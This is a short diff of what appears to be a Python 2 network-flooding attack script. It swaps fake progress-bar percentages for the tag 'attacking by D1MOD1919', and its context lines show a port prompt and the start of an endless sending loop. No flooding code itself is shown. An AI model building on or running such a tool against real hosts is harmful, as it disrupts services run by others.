@@ -29,15 +29,15 @@ port = input("Port       : ")
 
 os.system("clear")
 os.system("1919 Attacking is Start")
-print "[                    ] 0% "
+print "[                    ] attacking by D1MOD1919"
 time.sleep(5)
-print "[=====               ] 25%"
+print "[=====               ] attacking by D1MOD1919"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[==========          ] attacking by D1MOD1919"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[===============     ] attacking by D1MOD1919"
 time.sleep(5)
-print "[====================] 100%"
+print "[====================] attacking by D1MOD1919"
 time.sleep(3)
 sent = 0
 while True:
